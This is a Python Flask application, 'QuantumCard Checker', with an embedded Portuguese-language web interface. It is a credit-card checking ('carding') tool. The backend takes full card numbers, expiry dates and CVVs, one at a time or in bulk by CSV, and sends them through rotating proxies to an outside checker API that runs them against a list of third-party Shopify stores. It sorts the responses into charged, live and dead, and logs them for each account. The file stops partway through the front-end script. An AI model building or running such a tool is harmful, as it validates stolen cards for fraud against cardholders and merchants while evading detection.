#!/usr/bin/env python3
"""
QuantumCard Checker — Python/Flask Port
Original HTML/JS demo → Flask + SQLite + real Shopify checker backend
Run: python web_checker.py
Open: http://localhost:5000

Requirements: pip install flask aiohttp

Files needed in same folder:
- sitees.txt (Shopify sites)
- proxey.txt (proxies)
"""

from flask import Flask, request, jsonify, session, Response
import sqlite3, hashlib, secrets, time, re, random, os, json
import aiohttp, asyncio
from functools import wraps

# ═══════════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════════
app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', secrets.token_hex(32))

DB = os.getenv('DB', 'web_checker.db')
DEFAULT_API_URL = os.getenv('SHOPIFY_API', 'https://api-production-df508.up.railway.app/shopify')
SITES_FILE = os.getenv('SITES_FILE', 'sitees.txt')
PROXY_FILE = os.getenv('PROXY_FILE', 'proxey.txt')
PORT = int(os.getenv('PORT', '5000'))

# ═══════════════════════════════════════════════════════════════════
#  DATABASE
# ═══════════════════════════════════════════════════════════════════
def get_db():
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        first_name TEXT NOT NULL,
        last_name TEXT NOT NULL,
        email TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        created_at INTEGER NOT NULL
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS results (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        card_number TEXT NOT NULL,
        card_type TEXT NOT NULL,
        expiry TEXT NOT NULL,
        status TEXT NOT NULL,
        category TEXT NOT NULL,
        amount REAL NOT NULL,
        message TEXT,
        gateway TEXT,
        timestamp INTEGER NOT NULL
    )''')
    conn.commit()
    conn.close()

def hash_password(pw):
    return hashlib.sha256(pw.encode('utf-8')).hexdigest()

# ═══════════════════════════════════════════════════════════════════
#  CHECK HELPERS
# ═══════════════════════════════════════════════════════════════════
def _load_file(path):
    if not os.path.exists(path):
        return []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        return [l.strip() for l in f if l.strip()]

def load_sites(): return _load_file(SITES_FILE)
def load_proxies(): return _load_file(PROXY_FILE)

def _norm_proxy(proxy):
    if not proxy: return None
    proxy = str(proxy).strip()
    if not proxy: return None
    if '://' in proxy:
        m = re.match(r'^(?:https?|socks[45])://(?:([^:@]+):([^@]+)@)?([^:]+)(?::(\d+))?', proxy)
        if m:
            user, pwd, host, port = m.groups()
            if user and pwd:
                return f'{host}:{port}:{user}:{pwd}' if port else f'{host}:{user}:{pwd}'
            return f'{host}:{port}' if port else host
        return proxy
    if '@' in proxy:
        parts = proxy.split('@')
        if len(parts) == 2:
            creds, hp = parts[0].split(':'), parts[1].split(':')
            if len(creds) == 2 and len(hp) >= 1:
                return f'{hp[0]}:{hp[1]}:{creds[0]}:{creds[1]}' if len(hp) > 1 else f'{hp[0]}:{creds[0]}:{creds[1]}'
    parts = proxy.split(':')
    if len(parts) >= 4 and parts[-3].isdigit():
        return f"{':'.join(parts[:-3])}:{parts[-3]}:{parts[-2]}:{parts[-1]}"
    return proxy

def classify_response(resp):
    """Map Shopify API response string → (category, ui_status)."""
    s = str(resp or '').upper().replace('-', '_').replace(' ', '_').strip()
    if not s:
        return 'error', 'declined'
    # Site / HTTP errors
    for k in ('404', 'NOT_FOUND', 'TIMEOUT', 'BAD_GATEWAY', 'SERVICE_UNAVAILABLE',
              'GATEWAY_TIMEOUT', 'CONNECTION_RESET', 'CONNECTION_FAILED',
              'NETWORK_ERROR', 'CLOUDFLARE', 'ACCESS_DENIED', 'PROXY_ERROR',
              'PROXY_DEAD', 'CAPTCHA', 'INVALID_JSON', 'NO_SESSION',
              'NO_RECEIPT', 'NO_SUBMIT', 'NO_SELLER', 'THROTTLED'):
        if k in s:
            return 'error', 'declined'
    # Charged
    for k in ('ORDER_PAID', 'ORDER_CONFIRM', 'ORDER_CONFIRMED', 'ORDER_COMPLETED',
              'PAYMENT_SUCCESSFUL', 'PAYMENT_SUCCESSFUL', 'THANK_YOU'):
        if k in s:
            return 'charged', 'approved'
    # Live / Approved
    for k in ('OTP_REQUIRED', '3DS_REQUIRED', '3DS', 'AUTHENTICATION_REQUIRED',
              'INSUFFICIENT_FUNDS', 'INSUFFICIENTFUNDS'):
        if k in s:
            return 'approved', 'approved'
    # Dead / Declined
    for k in ('DECLINED', 'DECLINE', 'INVALID', 'EXPIRED', 'DO_NOT_HONOR',
              'INCORRECT_CVV', 'INCORRECT_CVC', 'PICKUP', 'STOLEN', 'LOST',
              'RESTRICTED', 'FRAUD', 'NOT_PAID', 'NOT_CHARGED', 'UNPAID'):
        if k in s:
            return 'declined', 'declined'
    return 'declined', 'declined'

def luhn_check(number):
    total = 0
    for i, d in enumerate(str(number)[::-1]):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

async def _async_check_shopify(card_str):
    """Run one real Shopify check. Returns dict with category, status, message, price, gateway."""
    sites = load_sites()
    proxies = load_proxies()
    if not sites:
        return {'category': 'error', 'status': 'declined', 'message': 'No sites configured', 'price': 0, 'gateway': '-'}
    if not proxies:
        return {'category': 'error', 'status': 'declined', 'message': 'No proxies configured', 'price': 0, 'gateway': '-'}

    last = None
    for attempt in range(3):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        proxy_str = _norm_proxy(proxy)
        if not site.startswith('http'):
            site = f'https://{site}'
        url = f'{DEFAULT_API_URL}?site={site}&cc={card_str}&proxy={proxy_str}'
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=45)) as s:
                async with s.get(url) as resp:
                    raw = await resp.json(content_type=None)
                    if not isinstance(raw, dict):
                        last = {'category': 'error', 'status': 'declined', 'message': 'Bad JSON', 'price': 0, 'gateway': '-'}
                        continue
                    rmsg = raw.get('Response', '') or ''
                    praw = raw.get('Price', 0)
                    gateway = raw.get('Gateway', 'Shopify') or 'Shopify'
                    category, ui_status = classify_response(rmsg)
                    try:
                        price = float(str(praw).replace('$', '').replace(',', '').strip())
                    except Exception:
                        price = 0.0
                    return {
                        'category': category,
                        'status': ui_status,
                        'message': rmsg or ui_status.upper(),
                        'price': price,
                        'gateway': gateway,
                    }
        except asyncio.TimeoutError:
            last = {'category': 'error', 'status': 'declined', 'message': 'Timeout', 'price': 0, 'gateway': '-'}
        except Exception as exc:
            last = {'category': 'error', 'status': 'declined', 'message': str(exc)[:120], 'price': 0, 'gateway': '-'}
    return last or {'category': 'error', 'status': 'declined', 'message': 'Max retries', 'price': 0, 'gateway': '-'}

def run_async(coro):
    """Run async coroutine from a sync Flask view safely."""
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# ═══════════════════════════════════════════════════════════════════
#  AUTH DECORATOR
# ═══════════════════════════════════════════════════════════════════
def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'error': 'Not authenticated'}), 401
        return f(*args, **kwargs)
    return wrapper

# ═══════════════════════════════════════════════════════════════════
#  AUTH ENDPOINTS
# ═══════════════════════════════════════════════════════════════════
@app.route('/api/register', methods=['POST'])
def api_register():
    d = request.get_json(silent=True) or {}
    fname = (d.get('firstName') or '').strip()
    lname = (d.get('lastName') or '').strip()
    email = (d.get('email') or '').strip().lower()
    pw = d.get('password') or ''

    if not all([fname, lname, email, pw]):
        return jsonify({'error': 'All fields are required'}), 400
    if len(pw) < 8:
        return jsonify({'error': 'Password must be at least 8 characters'}), 400
    if not re.match(r'^[^@\s]+@[^@\s]+\.[^@\s]+$', email):
        return jsonify({'error': 'Invalid email address'}), 400

    conn = get_db()
    try:
        conn.execute(
            'INSERT INTO users (first_name, last_name, email, password_hash, created_at) VALUES (?,?,?,?,?)',
            (fname, lname, email, hash_password(pw), int(time.time()))
        )
        conn.commit()
        row = conn.execute('SELECT id FROM users WHERE email = ?', (email,)).fetchone()
        session['user_id'] = row['id']
        session['user_name'] = fname
        return jsonify({'success': True, 'firstName': fname})
    except sqlite3.IntegrityError:
        return jsonify({'error': 'Email is already registered'}), 400
    finally:
        conn.close()

@app.route('/api/login', methods=['POST'])
def api_login():
    d = request.get_json(silent=True) or {}
    email = (d.get('email') or '').strip().lower()
    pw = d.get('password') or ''

    conn = get_db()
    row = conn.execute('SELECT * FROM users WHERE email = ?', (email,)).fetchone()
    conn.close()

    if not row or row['password_hash'] != hash_password(pw):
        return jsonify({'error': 'Invalid email or password'}), 401

    session['user_id'] = row['id']
    session['user_name'] = row['first_name']
    return jsonify({'success': True, 'firstName': row['first_name']})

@app.route('/api/logout', methods=['POST'])
def api_logout():
    session.clear()
    return jsonify({'success': True})

@app.route('/api/me')
def api_me():
    if 'user_id' not in session:
        return jsonify({'user': None})
    return jsonify({'user': {'firstName': session.get('user_name', 'User')}})

# ═══════════════════════════════════════════════════════════════════
#  CHECK ENDPOINTS
# ═══════════════════════════════════════════════════════════════════
@app.route('/api/check-card', methods=['POST'])
@login_required
def api_check_card():
    d = request.get_json(silent=True) or {}
    number = re.sub(r'\D', '', str(d.get('number') or ''))
    name = (d.get('name') or '').strip() or 'UNKNOWN'
    expiry = (d.get('expiry') or '').strip()
    cvv = re.sub(r'\D', '', str(d.get('cvv') or ''))
    ctype = (d.get('type') or 'unknown').lower()

    # Validation
    if not (13 <= len(number) <= 19):
        return jsonify({'error': 'Invalid card number length'}), 400
    m = re.match(r'^(\d{2})\s*/\s*(\d{2,4})$', expiry)
    if not m:
        return jsonify({'error': 'Invalid expiry (MM/YY)'}), 400
    mm = m.group(1)
    yy = m.group(2)
    full_yy = yy if len(yy) == 4 else f"20{yy}"
    if not (1 <= int(mm) <= 12):
        return jsonify({'error': 'Invalid expiry month'}), 400
    if not (3 <= len(cvv) <= 4):
        return jsonify({'error': 'Invalid CVV'}), 400
    if not luhn_check(number):
        # Skip API call for obviously invalid card
        conn = get_db()
        conn.execute(
            '''INSERT INTO results (user_id, card_number, card_type, expiry, status, category, amount, message, gateway, timestamp)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
            (session['user_id'], number, ctype, expiry, 'declined', 'declined', 0.0,
             'Invalid card number (Luhn failed)', '-', int(time.time()))
        )
        conn.commit()
        conn.close()
        return jsonify({
            'id': str(int(time.time() * 1000)),
            'number': number,
            'name': name,
            'expiry': expiry,
            'type': ctype,
            'status': 'declined',
            'category': 'declined',
            'amount': 0.0,
            'message': 'Invalid card number (Luhn failed)',
            'gateway': '-',
            'timestamp': int(time.time() * 1000),
        })

    # Real Shopify check
    card_str = f"{number}|{mm}|{full_yy}|{cvv}"
    result = run_async(_async_check_shopify(card_str))

    # Save to DB
    conn = get_db()
    conn.execute(
        '''INSERT INTO results (user_id, card_number, card_type, expiry, status, category, amount, message, gateway, timestamp)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
        (session['user_id'], number, ctype, expiry, result['status'], result['category'],
         float(result.get('price', 0) or 0), result.get('message', '-'),
         result.get('gateway', 'Shopify'), int(time.time()))
    )
    conn.commit()
    conn.close()

    return jsonify({
        'id': str(int(time.time() * 1000)),
        'number': number,
        'name': name,
        'expiry': expiry,
        'type': ctype,
        'status': result['status'],
        'category': result['category'],
        'amount': float(result.get('price', 0) or 0),
        'message': result.get('message', '-'),
        'gateway': result.get('gateway', 'Shopify'),
        'timestamp': int(time.time() * 1000),
    })

@app.route('/api/results')
@login_required
def api_results():
    conn = get_db()
    rows = conn.execute(
        'SELECT * FROM results WHERE user_id = ? ORDER BY timestamp DESC',
        (session['user_id'],)
    ).fetchall()
    conn.close()
    return jsonify({'results': [dict(r) for r in rows]})

@app.route('/api/results/clear', methods=['POST'])
@login_required
def api_results_clear():
    conn = get_db()
    conn.execute('DELETE FROM results WHERE user_id = ?', (session['user_id'],))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

# ═══════════════════════════════════════════════════════════════════
#  HTML TEMPLATE (unchanged UI, new JS)
# ═══════════════════════════════════════════════════════════════════
HTML_TEMPLATE = r'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QuantumCard Checker</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <style>
        .card-type { position: absolute; right: 10px; top: 10px; width: 60px; height: 40px;
            background-size: contain; background-repeat: no-repeat; background-position: center; }
        .card-front, .card-back { backface-visibility: hidden; transition: transform 0.6s;
            transform-style: preserve-3d; }
        .card-flipped .card-front { transform: rotateY(180deg); }
        .card-flipped .card-back { transform: rotateY(0deg); }
        .card-back { transform: rotateY(180deg); }
        .wave-pattern { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            opacity: 0.8; position: absolute; width: 100%; height: 100%; border-radius: 15px; }
        #loginForm, #registerForm, #dashboard, #cardChecker, #results { transition: all 0.5s ease; }
        .gradient-text { background: linear-gradient(90deg, #667eea, #764ba2);
            -webkit-background-clip: text; background-clip: text; color: transparent; }
    </style>
</head>
<body class="bg-gray-100 min-h-screen font-sans">
<div class="container mx-auto px-4 py-8">

<div id="authSection" class="max-w-md mx-auto bg-white rounded-xl shadow-md overflow-hidden md:max-w-2xl">
    <div class="flex border-b border-gray-200">
        <button id="loginTab" class="flex-1 py-4 px-6 text-center font-medium text-purple-600 border-b-2 border-purple-600">Entrar</button>
        <button id="registerTab" class="flex-1 py-4 px-6 text-center font-medium text-gray-500 hover:text-purple-600">Registrar</button>
    </div>

    <form id="loginForm" class="p-8 space-y-6">
        <h2 class="text-2xl font-bold text-center gradient-text">Bem-vindo de volta</h2>
        <div>
            <label for="loginEmail" class="block text-sm font-medium text-gray-700">E-mail</label>
            <input type="email" id="loginEmail" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-purple-500 focus:border-purple-500" required>
        </div>
        <div>
            <label for="loginPassword" class="block text-sm font-medium text-gray-700">Senha</label>
            <input type="password" id="loginPassword" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-purple-500 focus:border-purple-500" required>
        </div>
        <div class="flex items-center justify-between">
            <div class="flex items-center">
                <input id="rememberMe" type="checkbox" class="h-4 w-4 text-purple-600 focus:ring-purple-500 border-gray-300 rounded">
                <label for="rememberMe" class="ml-2 block text-sm text-gray-700">Lembrar de mim</label>
            </div>
        </div>
        <div>
            <button type="submit" class="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-purple-600 hover:bg-purple-700 focus:outline-none">
                Entrar
            </button>
        </div>
    </form>

    <form id="registerForm" class="p-8 space-y-6 hidden">
        <h2 class="text-2xl font-bold text-center gradient-text">Criar Conta</h2>
        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
                <label for="registerFirstName" class="block text-sm font-medium text-gray-700">Nome</label>
                <input type="text" id="registerFirstName" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-purple-500 focus:border-purple-500" required>
            </div>
            <div>
                <label for="registerLastName" class="block text-sm font-medium text-gray-700">Sobrenome</label>
                <input type="text" id="registerLastName" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-purple-500 focus:border-purple-500" required>
            </div>
        </div>
        <div>
            <label for="registerEmail" class="block text-sm font-medium text-gray-700">E-mail</label>
            <input type="email" id="registerEmail" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-purple-500 focus:border-purple-500" required>
        </div>
        <div>
            <label for="registerPassword" class="block text-sm font-medium text-gray-700">Senha</label>
            <input type="password" id="registerPassword" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-purple-500 focus:border-purple-500" required>
            <p class="mt-1 text-xs text-gray-500">Mínimo de 8 caracteres</p>
        </div>
        <div>
            <label for="registerConfirmPassword" class="block text-sm font-medium text-gray-700">Confirmar Senha</label>
            <input type="password" id="registerConfirmPassword" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-purple-500 focus:border-purple-500" required>
        </div>
        <div class="flex items-center">
            <input id="terms" type="checkbox" class="h-4 w-4 text-purple-600 focus:ring-purple-500 border-gray-300 rounded" required>
            <label for="terms" class="ml-2 block text-sm text-gray-700">Eu concordo com os termos e condições</label>
        </div>
        <div>
            <button type="submit" class="w-full flex justify-center py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-purple-600 hover:bg-purple-700">
                Registrar
            </button>
        </div>
    </form>
</div>

<div id="dashboard" class="hidden">
    <div class="flex items-center justify-between mb-8">
        <h1 class="text-3xl font-bold gradient-text">QuantumCard Checker</h1>
        <div class="flex items-center space-x-4">
            <span id="userGreeting" class="font-medium text-gray-700"></span>
            <button id="logoutBtn" class="px-4 py-2 text-sm text-white bg-red-500 rounded-lg hover:bg-red-600">Logout</button>
        </div>
    </div>

    <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
        <button id="checkCardTab" class="p-4 bg-white rounded-lg shadow-md hover:shadow-lg transition-all border-l-4 border-purple-600">
            <div class="flex items-center space-x-4">
                <div class="p-3 rounded-full bg-purple-100 text-purple-600">
                    <i class="fas fa-credit-card text-xl"></i>
                </div>
                <div>
                    <h3 class="font-semibold text-gray-800">Card Checker</h3>
                    <p class="text-gray-500 text-sm">Validate multiple credit cards</p>
                </div>
            </div>
        </button>
        <button id="resultsTab" class="p-4 bg-white rounded-lg shadow-md hover:shadow-lg transition-all border-l-4 border-blue-600">
            <div class="flex items-center space-x-4">
                <div class="p-3 rounded-full bg-blue-100 text-blue-600">
                    <i class="fas fa-database text-xl"></i>
                </div>
                <div>
                    <h3 class="font-semibold text-gray-800">Results Database</h3>
                    <p class="text-gray-500 text-sm">View tested cards history</p>
                </div>
            </div>
        </button>
        <div class="p-4 bg-white rounded-lg shadow-md">
            <div class="flex items-center space-x-4">
                <div class="p-3 rounded-full bg-green-100 text-green-600">
                    <i class="fas fa-chart-line text-xl"></i>
                </div>
                <div>
                    <h3 class="font-semibold text-gray-800">Statistics</h3>
                    <div class="flex space-x-2">
                        <span class="px-2 py-1 text-xs bg-purple-100 text-purple-800 rounded-full"><span id="approveCount">0</span> Approved</span>
                        <span class="px-2 py-1 text-xs bg-red-100 text-red-800 rounded-full"><span id="declineCount">0</span> Declined</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="cardChecker" class="bg-white rounded-xl shadow-md overflow-hidden p-6 mb-8">
        <h2 class="text-xl font-bold mb-6 gradient-text">Credit Card Checker</h2>

        <div class="relative mb-8">
            <div id="cardContainer" class="card-container relative w-full max-w-md h-56 perspective-1000 mx-auto">
                <div class="card-front absolute w-full h-full bg-gradient-to-br from-purple-600 to-indigo-700 rounded-xl shadow-xl p-6 text-white">
                    <div class="flex justify-between items-start mb-8">
                        <div>
                            <p class="text-xs opacity-70 mb-1">Número do Cartão</p>
                            <h3 id="cardNumberDisplay" class="text-xl tracking-widest font-mono">•••• •••• •••• ••••</h3>
                        </div>
                        <div class="card-type" id="cardTypeDisplay"></div>
                    </div>
                    <div class="flex justify-between items-end">
                        <div>
                            <p class="text-xs opacity-70 mb-1">Titular</p>
                            <h4 id="cardNameDisplay" class="text-sm">NOME COMPLETO</h4>
                        </div>
                        <div>
                            <p class="text-xs opacity-70 mb-1">Validade</p>
                            <h4 id="cardExpiryDisplay" class="text-sm">MM/AA</h4>
                        </div>
                    </div>
                </div>
                <div class="card-back absolute w-full h-full bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl shadow-xl p-6 text-white">
                    <div class="wave-pattern"></div>
                    <div class="h-8 bg-black absolute top-6 left-0 w-full"></div>
                    <div class="bg-white h-8 rounded mt-16 relative">
                        <span id="cardCvvDisplay" class="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-800 font-mono">•••</span>
                    </div>
                </div>
            </div>
            <button id="flipCardBtn" class="absolute right-6 bottom-6 bg-black bg-opacity-30 text-white rounded-full w-10 h-10 flex items-center justify-center">
                <i class="fas fa-redo"></i>
            </button>
        </div>

        <div class="mb-8">
            <h3 class="font-semibold text-gray-800 mb-3">Adicionar Detalhes do Cartão</h3>
            <form id="cardForm" class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                    <label for="cardNumber" class="block text-sm font-medium text-gray-700">Número do Cartão</label>
                    <input type="text" id="cardNumber" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-purple-500 focus:border-purple-500" placeholder="1234 5678 9012 3456" maxlength="19">
                </div>
                <div>
                    <label for="cardName" class="block text-sm font-medium text-gray-700">Nome do Titular</label>
                    <input type="text" id="cardName" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-purple-500 focus:border-purple-500" placeholder="JOÃO SILVA">
                </div>
                <div>
                    <label for="cardExpiry" class="block text-sm font-medium text-gray-700">Data de Validade</label>
                    <input type="text" id="cardExpiry" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-purple-500 focus:border-purple-500" placeholder="MM/AA" maxlength="5">
                </div>
                <div>
                    <label for="cardCvv" class="block text-sm font-medium text-gray-700">CVV</label>
                    <input type="text" id="cardCvv" class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-purple-500 focus:border-purple-500" placeholder="123" maxlength="4">
                </div>
                <div class="md:col-span-2">
                    <button type="submit" class="w-full md:w-auto px-6 py-2 bg-purple-600 text-white rounded-md hover:bg-purple-700 transition-colors">
                        Adicionar à Lista de Verificação
                    </button>
                </div>
            </form>
        </div>

        <div class="mb-8">
            <h3 class="font-semibold text-gray-800 mb-3">Importação em Massa</h3>
            <div class="border border-dashed border-gray-300 rounded-lg p-6 text-center">
                <div class="flex flex-col items-center justify-center">
                    <i class="fas fa-file-import text-4xl text-purple-600 mb-3"></i>
                    <p class="text-gray-600 mb-4">Faça upload de um arquivo CSV com múltiplos cartões</p>
                    <input type="file" id="csvFile" class="hidden" accept=".csv">
                    <button id="importCsvBtn" class="px-4 py-2 bg-gray-200 text-gray-700 rounded-md hover:bg-gray-300 transition-colors mr-2">
                        <i class="fas fa-file-csv mr-2"></i>Importar CSV
                    </button>
                    <button id="sampleCsvBtn" class="px-4 py-2 text-purple-600 border border-purple-600 rounded-md hover:bg-purple-50 transition-colors">
                        <i class="fas fa-download mr-2"></i>Baixar Modelo
                    </button>
                </div>
            </div>
        </div>

        <div>
            <div class="flex justify-between items-center mb-3">
                <h3 class="font-semibold text-gray-800">Cartões para Verificar (<span id="cardCount">0</span>)</h3>
                <button id="checkAllBtn" class="px-4 py-2 bg-green-600 text-white rounded-md hover:bg-green-700 transition-colors flex items-center">
                    <i class="fas fa-check-circle mr-2"></i>Verificar Todos
                </button>
            </div>
            <div id="cardList" class="bg-gray-50 rounded-lg p-4 border border-gray-200">
                <div class="text-center text-gray-500 py-10" id="emptyCardListMessage">
                    <i class="fas fa-credit-card text-4xl mb-3 opacity-30"></i>
                    <p>Nenhum cartão adicionado ainda. Adicione cartões para iniciar a validação.</p>
                </div>
            </div>
        </div>
    </div>

    <div id="results" class="bg-white rounded-xl shadow-md overflow-hidden p-6 hidden">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-xl font-bold gradient-text">Tested Cards Database</h2>
            <div class="flex space-x-2">
                <select id="filterStatus" class="border rounded-md px-3 py-1 text-sm">
                    <option value="all">All Status</option>
                    <option value="approved">Approved</option>
                    <option value="declined">Declined</option>
                </select>
                <select id="filterType" class="border rounded-md px-3 py-1 text-sm">
                    <option value="all">All Types</option>
                    <option value="visa">Visa</option>
                    <option value="mastercard">Mastercard</option>
                    <option value="amex">American Express</option>
                    <option value="discover">Discover</option>
                </select>
                <button id="exportResultsBtn" class="px-3 py-1 bg-purple-600 text-white rounded-md text-sm hover:bg-purple-700 flex items-center">
                    <i class="fas fa-file-export mr-1"></i> Export
                </button>
            </div>
        </div>

        <div class="overflow-x-auto">
            <table class="min-w-full divide-y divide-gray-200">
                <thead class="bg-gray-50">
                    <tr>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Card Number</th>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Type</th>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Expiry</th>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Status</th>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Amount</th>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Response</th>
                        <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase">Checked On</th>
                    </tr>
                </thead>
                <tbody id="resultsTableBody" class="bg-white divide-y divide-gray-200">
                    <tr>
                        <td colspan="7" class="px-6 py-4 text-center text-gray-500">
                            No test results yet. Validate some cards to see results here.
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</div>

</div>

<script>
// ── DOM ──
const authSection = document.getElementById('authSection');
const dashboard = document.getElementById('dashboard');
const loginForm = document.getElementById('loginForm');
const registerForm = document.getElementById('registerForm');
const loginTab = document.getElementById('loginTab');
const registerTab = document.getElementById('registerTab');
const logoutBtn = document.getElementById('logoutBtn');
const userGreeting = document.getElementById('userGreeting');

const checkCardTab = document.getElementById('checkCardTab');
const resultsTab = document.getElementById('resultsTab');
const cardChecker = document.getElementById('cardChecker');
const results = document.getElementById('results');

const cardNumberDisplay = document.getElementById('cardNumberDisplay');
const cardNameDisplay = document.getElementById('cardNameDisplay');
const cardExpiryDisplay = document.getElementById('cardExpiryDisplay');
const cardCvvDisplay = document.getElementById('cardCvvDisplay');
const cardTypeDisplay = document.getElementById('cardTypeDisplay');
const cardContainer = document.getElementById('cardContainer');
const flipCardBtn = document.getElementById('flipCardBtn');

const cardForm = document.getElementById('cardForm');
const cardNumber = document.getElementById('cardNumber');
const cardName = document.getElementById('cardName');
const cardExpiry = document.getElementById('cardExpiry');
const cardCvv = document.getElementById('cardCvv');
const csvFile = document.getElementById('csvFile');
const importCsvBtn = document.getElementById('importCsvBtn');
const sampleCsvBtn = document.getElementById('sampleCsvBtn');

const cardList = document.getElementById('cardList');
const emptyCardListMessage = document.getElementById('emptyCardListMessage');
const cardCount = document.getElementById('cardCount');
const checkAllBtn = document.getElementById('checkAllBtn');

const resultsTableBody = document.getElementById('resultsTableBody');
const filterStatus = document.getElementById('filterStatus');
const filterType = document.getElementById('filterType');
const exportResultsBtn = document.getElementById('exportResultsBtn');
const approveCount = document.getElementById('approveCount');
const declineCount = document.getElementById('declineCount');

let cardsToCheck = [];
let testResults = [];
let currentUser = null;
let isCardFlipped = false;

// ── Auth ──
async function checkAuth() {
    try {
        const r = await fetch('/api/me');
        const d = await r.json();
        if (d.user) {
            currentUser = d.user;
            showDashboard();
            await loadResults();
        } else {
            showAuth();
        }
    } catch (e) { showAuth(); }
}

function showAuth() {
    authSection.classList.remove('hidden');
    dashboard.classList.add('hidden');
}

function showDashboard() {
    authSection.classList.add('hidden');
    dashboard.classList.remove('hidden');
    userGreeting.textContent = `Hello, ${currentUser.firstName}!`;
}

document.addEventListener('DOMContentLoaded', () => {
    checkAuth();
    loadCardsFromStorage();
});

function loadCardsFromStorage() {
    try {
        const s = localStorage.getItem('cardsToCheck');
        if (s) cardsToCheck = JSON.parse(s);
    } catch (e) {}
    renderCardList();
    updateCardCount();
}

function saveCards() {
    localStorage.setItem('cardsToCheck', JSON.stringify(cardsToCheck));
}

// ── Tabs ──
loginTab.addEventListener('click', () => {
    loginTab.classList.add('text-purple-600', 'border-purple-600');
    loginTab.classList.remove('text-gray-500');
    registerTab.classList.add('text-gray-500');
    registerTab.classList.remove('text-purple-600', 'border-purple-600');
    loginForm.classList.remove('hidden');
    registerForm.classList.add('hidden');
});

registerTab.addEventListener('click', () => {
    registerTab.classList.add('text-purple-600', 'border-purple-600');
    registerTab.classList.remove('text-gray-500');
    loginTab.classList.add('text-gray-500');
    loginTab.classList.remove('text-purple-600', 'border-purple-600');
    registerForm.classList.remove('hidden');
    loginForm.classList.add('hidden');
});

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('loginEmail').value.trim();
    const password = document.getElementById('loginPassword').value;

    try {
        const r = await fetch('/api/login', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({email, password})
        });
        const d = await r.json();
        if (d.success) {
            currentUser = {firstName: d.firstName};
            showDashboard();
            await loadResults();
        } else {
            alert(d.error || 'Login failed');
        }
    } catch (e) { alert('Network error'); }
});

registerForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    const firstName = document.getElementById('registerFirstName').value.trim();
    const lastName = document.getElementById('registerLastName').value.trim();
    const email = document.getElementById('registerEmail').value.trim();
    const password = document.getElementById('registerPassword').value;
    const confirmPassword = document.getElementById('registerConfirmPassword').value;
    const terms = document.getElementById('terms').checked;

    if (password !== confirmPassword) return alert('Passwords do not match');
    if (!terms) return alert('Please agree to terms');

    try {
        const r = await fetch('/api/register', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({firstName, lastName, email, password})
        });
        const d = await r.json();
        if (d.success) {
            currentUser = {firstName: d.firstName};
